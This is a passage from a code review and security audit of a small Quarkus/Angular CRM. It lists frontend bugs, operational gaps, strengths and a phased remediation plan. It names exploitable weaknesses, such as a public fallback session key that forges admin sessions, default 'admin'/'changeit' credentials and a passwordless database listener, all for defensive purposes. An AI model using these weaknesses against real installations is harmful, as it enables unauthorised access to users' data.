  `:191-198`). The HTTP path is capped at 64M, but restore-by-name reads whatever sits in the folder
  under a valid name — a multi-gigabyte file OOMs the JVM before the limit is consulted. Check
  `Files.size` first.
- **Loose prefix matching in `DataChangeFilter`** (`:46-63`). `path.startsWith("api/users")` is not
  segment matching, so a future `api/userstats` write endpoint would be silently excluded from
  backups. All ten current paths are handled correctly. Also, a request whose transaction committed
  but whose response then failed (5xx) does not trigger a backup.
- **Backup write failures are only logged** (`AutoBackupTrigger.runQuietly`, `:121-127`). A
  permanently full or read-only backup directory silently stops all automatic backups; with no log
  retention ([OPS-2](#ops-2--medium--no-production-logging-story)) there is no trace at all. Surface
  "last successful backup" in the UI or a health check.
- **Duplicate or null `id` values in a hand-edited file corrupt the re-linking maps silently**
  (`:242`). A cheap validation in `parse()` would make such files fail loudly.

---

## 4. Frontend (Angular)

### UI-1 · High · Session expiry mid-form discards the user's work

**Files:** `src/app/core/session.interceptor.ts:41-51`; `src/app/features/login/login.page.ts:147-149`.

On any 401 other than the login call, the interceptor does `auth.clear(); void
router.navigate(['/login']);` — a hard navigation with no return URL and no attempt to preserve
state. The login page afterwards always navigates to `'/'`.

**Failure scenario.** A user spends ten minutes writing notes in the contact dialog. Their session
times out. They press Save, the POST returns 401, the interceptor navigates away and destroys the
routed page tree along with the dialog. Everything typed is gone, and after re-login they land on
the dashboard rather than where they were.

**Fix.** Pass the current URL as a `returnUrl` query parameter and honor it in `LoginPage.submit()`.
Better: on a 401 from a *mutation*, keep the page mounted and show a re-authentication dialog so the
draft survives.

### UI-2 · Medium · Blank error toast on 401 and on any unmapped code

**Files:** `src/app/core/i18n/i18n.service.ts:64-70`; `src/app/core/problem.ts:68-79`.

`defaultCodeFor(401)` returns `'UNAUTHORIZED'`, but no `error.UNAUTHORIZED` key exists in either
catalogue. `errorMessage` then runs `return fallback ?? this.t('error.unexpected')` — and `fallback`
is `problem.message`, the **empty string** for a body-less 401. Since `'' ?? x` evaluates to `''`,
the user gets an empty red toast box. **Fix:** use `fallback || this.t('error.unexpected')`, and
make `defaultCodeFor(401)` consistent with the lowercase 403/404 branches.

### UI-3 · Medium · No double-submit protection on the interaction form

**File:** `src/app/features/contacts/contact-detail.page.ts:291-307` (button at `:144-152`).

Every other form in the application guards with a `saving()` signal. `saveInteraction()` has
neither an in-flight check nor a disabled binding — the button is only `[disabled]="!entry.subject"`.
A double-click creates two identical activity entries. **Fix:** reuse the `saving` pattern from
`ContactsPage.save()`.

### UI-4 · Medium · Search responses can arrive out of order

**Files:** `src/app/features/contacts/contacts.page.ts:248-252,304-313`;
`src/app/features/companies/companies.page.ts:202-207,257-266`.

`onSearch` debounces 250 ms but nothing cancels or sequences in-flight requests, so whichever
response resolves last wins. Typing "mü", pausing, then "ller" can leave the table showing results
for "mü" while the box reads "müller" — the narrower query often returns faster. The calendar's
`checkConflicts` (`calendar.page.ts:533`) already guards against exactly this with
`if (this.draft() === entry)`; the list pages just do not. **Fix:** a request sequence number, or
`switchMap` over an observable.

### UI-5 · Medium · Deal column totals add mixed currencies and label the sum EUR

**File:** `src/app/features/deals/deals.page.ts:73,315-317`. `stageTotal()` reduces over
`deal.amount` and the template renders `format.money(stageTotal(stage), 'EUR')`, while each deal
carries its own currency and the edit dialog accepts any three-letter code. A stage holding 10,000
USD and 5,000 EUR displays "€15.000,00". Same root cause as
[API-5](#api-5--medium--the-dashboard-sums-deal-amounts-across-different-currencies) and worth
fixing together.

### UI-6 · Medium · Confirm dialog: Escape rarely works, no focus trap, concurrent calls orphan promises

**Files:** `src/app/shared/confirm-host.component.ts:27`; `src/app/shared/confirm.service.ts:43-47`.

`(keydown.escape)` sits on the backdrop `div`, but nothing moves focus into it — after clicking a
row's Delete button, focus stays on that button outside the backdrop, so the handler never fires.
There is no focus trap and no initial focus, so keyboard users can Tab into the page behind the
"modal". And a second `ask()` while one is pending overwrites `this.pending`, so the first caller's
`await` never resolves. **Fix:** use the native `<dialog>` element with `showModal()`, which
provides focus, Escape, and trapping; queue or reject concurrent `ask()` calls.

### UI-7 · Medium · No pagination or virtualization; pickers fetch entire tables

**Files:** `src/app/core/api.service.ts:92-96,114-118,136-140` (no page/size parameters exist);
consumers in contacts, deals, tasks, calendar. The deal, task, and appointment dialogs each load
*all* contacts plus all companies or deals to populate `<select>` dropdowns, and
`ContactDetailPage.load()` fetches every deal in the system to filter client-side
(`contact-detail.page.ts:337,342`). This is the client half of
[API-3](#api-3--high--every-list-endpoint-is-unbounded). **Fix:** server-side paging, a typeahead
instead of full-table selects, and a `contactId` filter on `listDeals`.

### UI-8 · Low · Further frontend issues

- **Contact detail does not reload when `:id` changes** (`contact-detail.page.ts:248,267-269`).
  `load()` runs once via `queueMicrotask` in the constructor with no `effect()` on `id`. Harmless
  today because nothing links contact-to-contact; the first such link shows stale data. Use an
  `effect`.
- **New appointment defaults to midnight between 23:00 and 24:00** (`calendar.page.ts:59-68`).
  `defaultStart()` adds an hour before testing `getHours() >= 23`, so after rollover the hour is 0
  and the "tomorrow at 9" branch never fires. Test the hour before rollover.
- **Clearing a required date/time yields a misleading "unexpected error"**
  (`calendar.util.ts:26-28`, `contact-detail.page.ts:297-299`). Angular adds `novalidate`, so
  `required` never blocks submission; `new Date('T10:00:00').toISOString()` throws a `RangeError`
  that maps to the generic toast rather than a field error.
- **Sign-out over a flaky network strands the user** (`auth.service.ts:80-87`,
  `shell.component.ts:245-248`). `signOut()` has `try/finally` but no `catch`, so a network error
  propagates and `router.navigate(['/login'])` is never reached: local state is cleared but the user
  stays on a protected page with an unhandled rejection.
- **A transient server error at boot logs a valid session out** (`auth.service.ts:46-57`).
  `refresh()` catches everything from `/api/auth/me` and resolves `null`, so a 500 or network blip
  during startup is indistinguishable from "not signed in". Distinguish 401 from 0/5xx.
- **Backup upload input is never reset** (`backups.page.ts:218-221,281-287`). After a restore the
  DOM input still shows the filename, and re-selecting the same file fires no `change` event, so the
  button cannot be re-armed. Clear `input.value`.
- **Full source maps ship to production** (`angular.json:46-51`, `"hidden": false`). Already noted in
  `todo.md`; low impact for an Apache-2.0 application.

---

## 5. Build and operations

### OPS-1 · High · The README recommends an unsafe backup procedure

**File:** `README.md:31-32` — "The database lives in `./data/smallcrm.mv.db`. … That one file is the
entire installation — copy it and you have a backup."

Copying an `.mv.db` file while the application is running (with `DB_CLOSE_DELAY=-1` holding the
MVStore open) can capture a torn, unrecoverable state. This is the one backup instruction users will
actually follow, and it is the unsafe one.

**Failure scenario.** The user sets a nightly `cp data/smallcrm.mv.db …` while the app runs. A copy
taken during a write is corrupt, and this is discovered only after the disk dies — exactly when the
file was supposed to be "the entire installation".

**Fix.** Change the README to say the application must be stopped first, or document H2's online-safe
`BACKUP TO 'file.zip'`. Cross-reference the XML backups as the running-system mechanism, with the
[BAK-2](#bak-2--high--full-disaster-recovery-is-impossible-from-the-xml-backups-alone) caveat about
accounts stated plainly.

### OPS-2 · Medium · No production logging story

**File:** `src/main/resources/application.properties` — no `quarkus.log.file.*`, no
`quarkus.http.access-log.*`; the only logging configuration is `%dev` DEBUG at `:103`.

Run as the README instructs (`java -jar target/quarkus-app/quarkus-run.jar`), all logs go to a
terminal and evaporate when it closes. After an incident — a failed restore, login abuse, the
swallowed backup failures in `AutoBackupTrigger.runQuietly` — there is nothing to inspect.

**Failure scenario.** The backup directory becomes read-only in March. Every backup since then failed
with a console message nobody retained. In June the user restores after a mistake and discovers the
newest backup is three months old.

**Fix.** `%prod.quarkus.log.file.enable=true` with `quarkus.log.file.rotation.*` (size cap and max
backups, so a small machine cannot fill its disk), `quarkus.http.access-log.enabled=true`, and at
minimum log authentication failures.

### OPS-3 · Medium · No `%prod` profile; production runs on dev defaults

**File:** `src/main/resources/application.properties` has `%dev` (`:103-104`) and `%test`
(`:107-121`) sections and no `%prod` line anywhere.

Everything that ought to differ in production — session-key enforcement, `cookie-secure`, OpenAPI
exposure, file logging, the H2 URL without `AUTO_SERVER` — has no place to live, so the shipped jar
uses dev defaults. Nothing sets `quarkus.shutdown.timeout` either, so in-flight requests are not
drained on SIGTERM. Data integrity survives a kill (transactions, atomic backup moves, MVStore
recovery), but an in-flight restore or upload gets a connection reset.

**Fix.** Add a `%prod` block covering the session key, `cookie-secure`, `shutdown.timeout=10s`, file
logging, and OpenAPI off.

### OPS-4 · Medium · `/q/openapi` is publicly reachable

**File:** `src/main/resources/application.properties:50` lists `/q/openapi`, `/q/swagger-ui` and
`/q/swagger-ui/*` in the permit list. `quarkus-smallrye-openapi` serves `/q/openapi` in production by
default (Swagger UI is dev-only, so those two entries are inert but misleading).

Any unauthenticated client gets the complete API surface — every endpoint, parameter, DTO shape and
error code, including the admin-only `/api/users` and `/api/backups` trees. That is a reconnaissance
gift given the unthrottled login endpoint
([SEC-7](#sec-7--medium--no-brute-force-protection-or-rate-limiting-on-login)).

**Fix.** Remove those three entries and add `%prod.quarkus.smallrye-openapi.enable=false`. Consider
moving health checks to the management interface bound to localhost.

### OPS-5 · Medium · A mistyped `SMALLCRM_DATA_DIR` silently creates an empty database

The JDBC URL (`:22`) lacks `IFEXISTS=TRUE`, so H2 creates the file on first connect, Flyway migrates
it from V1, and bootstrap creates a fresh `admin`/`changeit`.

**Failure scenario.** The user moves the data directory and sets
`SMALLCRM_DATA_DIR=/Volumes/Backup/crm-dat` (typo). The application starts *successfully* and
presents a first-run login. The user concludes their data is gone — or worse, starts re-entering data
into the wrong file. For the stated audience this is the most likely real-world data-loss event.

**Fix.** A startup guard: if the configured data directory is non-default and contains no
`smallcrm.mv.db`, refuse to start unless an explicit initialization flag is given. `IFEXISTS=TRUE`
alone would break genuine first runs, so this needs application-level logic.

### OPS-6 · Low · Further operational gaps

- **No dependency vulnerability scanning.** `pom.xml` has quarkus, surefire/failsafe, jacoco,
  checkstyle and rat — no OWASP dependency-check, and nothing for the two pnpm lockfiles. Pinning to
  3.37.4 over 3.38.0 (`assumption.md` #18) is sensible, but there is no mechanism to learn when
  3.37.x needs a bump. Add dependency-check to `verify` or a scheduled audit.
- **No service definition or restart story.** No systemd unit or launchd plist, and nothing restarts
  the application after a crash or reboot — the CRM is simply down until the owner notices. (Absence
  of Docker is a deliberate product stance and not a finding.) Ship a sample unit in `docs/`.
- **No documented H2 upgrade path.** H2's file format changes across major versions, so a future
  Quarkus BOM bump can make the application refuse to open an existing `smallcrm.mv.db` — and the XML
  backups cannot fully cover the migration because they exclude accounts.
- **Bootstrap race window.** Between first start and the operator's first login, anyone reaching the
  port can claim the admin account (see
  [SEC-5](#sec-5--high--published-default-admin-credentials-with-no-first-run-binding)). Negligible
  on localhost, real on a small-office LAN.

### Verified clean

`git ls-files` confirms **nothing sensitive is committed**: no live database (`data/`), no
`e2e/.auth/admin.json`, no `playwright-report/`, no `coverage/`, no `.DS_Store`, no `node_modules`.
Those files exist on disk and are correctly ignored — the `.gitignore` is careful, including a
properly anchored `/backup/` to avoid catching a Java package of the same name.

Flyway's `baseline-on-migrate=true` is **not** the footgun it can be: it only baselines a non-empty
schema lacking a history table, so a fresh database runs V1-V3 normally, and the test profile runs
the real migrations against an empty database with Hibernate in `validate` mode, meaning schema
drift fails the build.

---

## 6. Known gaps already recorded in `todo.md`

`todo.md` is unusually honest, and most of what it lists is a fair scope cut for a proof of concept.
Four of its entries are, on this review's evidence, **release gates rather than backlog** — they are
cross-referenced above with the additional detail this review adds:

| `todo.md` entry | This review |
| --- | --- |
| "A real session secret" | [SEC-1](#sec-1--critical--hardcoded-fallback-session-key-allows-forging-an-admin-session) — Critical, not a hardening step: the key is public and forges admin sessions |
| "HTTPS and secure cookies" | [SEC-3](#sec-3--high--secure-flag-is-never-set-and-x-forwarded-proto-is-not-trusted) — plus the reverse-proxy case does not work without `proxy-address-forwarding` |
| "Password rules and rate limiting" | [SEC-7](#sec-7--medium--no-brute-force-protection-or-rate-limiting-on-login), [SEC-14](#sec-14--low--weak-password-policy-and-silent-bcrypt-truncation) |
| "Nothing verifies a backup can be restored" | [BAK-1](#bak-1--high--restore-silently-destroys-every-createdat-and-updatedat), [BAK-4](#bak-4--medium--export-is-not-a-consistent-snapshot), [BAK-5](#bak-5--medium--backup-files-are-never-fsynced) — the unverified backups are also silently lossy and possibly inconsistent |

Fair scope cuts, accepted as recorded: off-site backups, accounts excluded from backups (though see
[BAK-2](#bak-2--high--full-disaster-recovery-is-impossible-from-the-xml-backups-alone) for what that
means in a real disaster), deactivation enforced post-authentication
([SEC-8](#sec-8--medium--deactivated-accounts-still-authenticate-and-receive-a-valid-cookie)), no
audit trail, no CSRF extension ([SEC-9](#sec-9--medium--no-csrf-token-and-one-mutating-endpoint-is-html-form-reachable)
notes one endpoint where this matters more than the entry implies), pagination
([API-3](#api-3--high--every-list-endpoint-is-unbounded)), optimistic locking not surfaced
([API-1](#api-1--high--optimistic-locking-exists-but-is-inert--concurrent-edits-are-silent-lost-updates)),
hidden source maps, accessibility audit, Google Calendar sync, and the feature backlog.

---

## 7. What the codebase does well

Worth stating explicitly, because it shapes how much work the above actually represents:

- **Authorization is correct and complete.** Every resource class was read in full including
  class-level annotations. `UserResource:42-46` and `BackupResource:51-54` carry class-level
  `@RolesAllowed(ADMIN)` and no method weakens it; every other resource carries `@Authenticated`.
  There is no admin functionality reachable by a non-admin and no privilege-escalation path.
- **Deny-by-default HTTP policy** with a short, deliberate permit list rather than the reverse.
- **Roles are re-read from the database on every request**, so demoting an admin takes effect
  immediately rather than at next login — a common and serious mistake this application avoids.
- **XXE is explicitly disabled** (`BackupXml:50-51` sets both `SUPPORT_DTD=false` and
  `IS_SUPPORTING_EXTERNAL_ENTITIES=false`), which matters because restore accepts attacker-supplied
  XML.
- **Path traversal is defended twice and tested** — `BackupFiles.isSafeName:75-82` plus
  `BackupService.resolve:106-115` (`normalize()` + `startsWith`), with an encoded `..%2F` test case.
- **No SQL or JPQL injection anywhere**; all dynamic filters build from fixed fragments with named
  parameters.
- **No XSS sinks in the frontend** — zero hits for `innerHTML`, `bypassSecurityTrust*`,
  `insertAdjacentHTML`, `document.write`, `srcdoc` across the whole SPA.
- **Complete route-guard coverage**, with `ensureLoaded()` correctly sharing one in-flight `/me`
  request across concurrent guards, so there is no 401 stampede or redirect loop.
- **Type-safe i18n**: `DE: Record<TranslationKey, string>` makes a missing German key a compile
  error, and `Accept-Language` propagates so server validation messages match the UI language.
- **Restore is atomic in the single-node case** — the safety copy is written before the delete, and
  delete-plus-inserts is one transaction that rolls back cleanly.
- **Atomic backup writes** (temp file plus rename), foreign files in the backup folder are never
  listed or deleted, and backup failures never fail or delay a user request.
- **Last-admin lockout protection is thorough**, covering demotion, deactivation, deletion, and
  self-targeting.
- **Password hygiene**: bcrypt with a fresh salt, hashes never exposed in DTOs, current-password
  verification and reuse rejection on change, forced change on every admin-set password.
- **Schema discipline**: Flyway owns DDL, Hibernate validates, migrations are exercised against an
  empty database in tests, and V1 matches the entities column for column.
- **Enforced coverage floors** across all three suites, plus license and style gates that fail the
  build.
- **Supply-chain hygiene** — `--ignore-scripts` and frozen lockfiles in both the Quinoa config and
  the e2e profile.

---

## 8. Suggested remediation order

**Phase 1 — release gates (roughly a day).** Mostly configuration.

1. [SEC-1](#sec-1--critical--hardcoded-fallback-session-key-allows-forging-an-admin-session) remove the session-key fallback and fail fast
2. [SEC-5](#sec-5--high--published-default-admin-credentials-with-no-first-run-binding) generate the bootstrap password; purge `changeit` from README and manual
3. [SEC-2](#sec-2--high--session-cookie-is-not-httponly) / [SEC-3](#sec-3--high--secure-flag-is-never-set-and-x-forwarded-proto-is-not-trusted) `http-only-cookie`, `cookie-secure`, proxy forwarding, TLS documentation
4. [SEC-4](#sec-4--high--h2-auto_servertrue-exposes-a-passwordless-database-listener) drop `AUTO_SERVER=TRUE`, set a datasource password
5. [BAK-1](#bak-1--high--restore-silently-destroys-every-createdat-and-updatedat) preserve timestamps on restore, with a round-trip test
6. [OPS-1](#ops-1--high--the-readme-recommends-an-unsafe-backup-procedure) correct the backup instructions
7. [OPS-3](#ops-3--medium--no-prod-profile-production-runs-on-dev-defaults) / [OPS-4](#ops-4--medium--qopenapi-is-publicly-reachable) add a `%prod` profile; close `/q/openapi`

**Phase 2 — data integrity (a few days).**

8. [API-1](#api-1--high--optimistic-locking-exists-but-is-inert--concurrent-edits-are-silent-lost-updates) round-trip `version`, return 409
9. [API-2](#api-2--high--appointment-double-booking-guard-is-check-then-act-and-can-be-raced) serialize the appointment guard
10. [BAK-3](#bak-3--medium--no-concurrency-control-around-restore) / [BAK-4](#bak-4--medium--export-is-not-a-consistent-snapshot) one service lock fixes both, plus [BAK-6](#bak-6--low--further-backup-issues)'s filename race
11. [BAK-5](#bak-5--medium--backup-files-are-never-fsynced) fsync backups
12. [SEC-6](#sec-6--medium--password-changes-do-not-invalidate-existing-sessions) invalidate sessions on password change
13. [OPS-5](#ops-5--medium--a-mistyped-smallcrm_data_dir-silently-creates-an-empty-database) guard against an accidentally empty data directory

**Phase 3 — hardening and correctness (a week).**

14. [SEC-7](#sec-7--medium--no-brute-force-protection-or-rate-limiting-on-login) / [SEC-8](#sec-8--medium--deactivated-accounts-still-authenticate-and-receive-a-valid-cookie) / [SEC-9](#sec-9--medium--no-csrf-token-and-one-mutating-endpoint-is-html-form-reachable) / [SEC-10](#sec-10--medium--no-security-response-headers) rate limiting, augmentor, CSRF on the upload, headers
15. [API-5](#api-5--medium--the-dashboard-sums-deal-amounts-across-different-currencies) + [UI-5](#ui-5--medium--deal-column-totals-add-mixed-currencies-and-label-the-sum-eur) currency handling (fix together)
16. [API-6](#api-6--medium--deal-pipeline-order-sort-is-alphabetical) through [API-9](#api-9--medium--no-catch-all-exception-mapper-duplicate-username-race-returns-500) sort order, tag validation, enum converters, catch-all mapper
17. [UI-1](#ui-1--high--session-expiry-mid-form-discards-the-users-work) through [UI-4](#ui-4--medium--search-responses-can-arrive-out-of-order), [UI-6](#ui-6--medium--confirm-dialog-escape-rarely-works-no-focus-trap-concurrent-calls-orphan-promises) session-expiry UX, blank toast, double-submit, search race, dialog keyboard handling
18. [OPS-2](#ops-2--medium--no-production-logging-story) file logging with rotation

**Phase 4 — scale, once the record count justifies it.**

19. [API-3](#api-3--high--every-list-endpoint-is-unbounded) + [UI-7](#ui-7--medium--no-pagination-or-virtualization-pickers-fetch-entire-tables) pagination end to end
20. [API-4](#api-4--medium--n1-query-storm-when-mapping-lists-to-dtos) fetch joins or batch fetching
21. [BAK-2](#bak-2--high--full-disaster-recovery-is-impossible-from-the-xml-backups-alone) full-snapshot backups including accounts
22. Remaining Low items and the `todo.md` backlog

**Testing gaps worth closing alongside.** No test covers two users working concurrently, which is
where [API-1](#api-1--high--optimistic-locking-exists-but-is-inert--concurrent-edits-are-silent-lost-updates)
and [API-2](#api-2--high--appointment-double-booking-guard-is-check-then-act-and-can-be-raced) live;
no backup test asserts on timestamps, which is why
[BAK-1](#bak-1--high--restore-silently-destroys-every-createdat-and-updatedat) went unnoticed; and
there is no volume test, so the cost of
[API-3](#api-3--high--every-list-endpoint-is-unbounded)/[API-4](#api-4--medium--n1-query-storm-when-mapping-lists-to-dtos)
is unmeasured.
